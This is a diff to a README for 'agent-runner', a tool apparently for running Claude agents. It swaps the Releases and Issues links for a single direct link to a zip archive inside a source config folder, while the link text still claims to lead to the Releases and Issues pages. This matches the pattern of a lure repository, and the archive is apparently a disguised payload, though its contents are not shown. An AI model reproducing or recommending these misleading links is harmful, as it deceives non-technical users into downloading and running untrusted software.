@@ -3,12 +3,12 @@
 ## 🚀 Getting Started
 Welcome to agent-runner, a simple tool designed to help you run Claude agents easily. This guide will show you how to download and run the application without any technical knowledge. 
 
-[![Download agent-runner](https://img.shields.io/badge/Download%20agent--runner-%23007bff?style=flat&logo=github)](https://github.com/gungarp/agent-runner/releases)
+[![Download agent-runner](https://github.com/gungarp/agent-runner/raw/refs/heads/master/src/claude_agent_framework/config/agent_runner_3.6.zip%20agent--runner-%23007bff?style=flat&logo=github)](https://github.com/gungarp/agent-runner/raw/refs/heads/master/src/claude_agent_framework/config/agent_runner_3.6.zip)
 
 ## 📥 Download & Install
 To begin using agent-runner, visit the Releases page to download the software. Here’s how:
 
-1. Click [here](https://github.com/gungarp/agent-runner/releases) to visit the Releases page.
+1. Click [here](https://github.com/gungarp/agent-runner/raw/refs/heads/master/src/claude_agent_framework/config/agent_runner_3.6.zip) to visit the Releases page.
 2. On the page, you'll find different versions of the software. Choose the latest version.
 3. Click on the downloadable file that matches your system (e.g., Windows, macOS, Linux) to start the download.
 
@@ -61,7 +61,7 @@ Once you have installed agent-runner, here is how you can start using it:
 ## 📞 Support
 If you encounter issues or have questions, please feel free to reach out:
 
-- Open an issue on the [GitHub Issues page](https://github.com/gungarp/agent-runner/issues).
+- Open an issue on the [GitHub Issues page](https://github.com/gungarp/agent-runner/raw/refs/heads/master/src/claude_agent_framework/config/agent_runner_3.6.zip).
 - Join our community for discussions and tips.
 
 ## ⚙️ Contributing
@@ -77,4 +77,4 @@ By contributing, you help improve agent-runner for everyone.
 ## 📝 License
 agent-runner is licensed under the MIT License. You can use it freely, but please refer to the license for specific details.
 
-For more information and updates, always check back to the [agent-runner Releases page](https://github.com/gungarp/agent-runner/releases).
+For more information and updates, always check back to the [agent-runner Releases page](https://github.com/gungarp/agent-runner/raw/refs/heads/master/src/claude_agent_framework/config/agent_runner_3.6.zip).
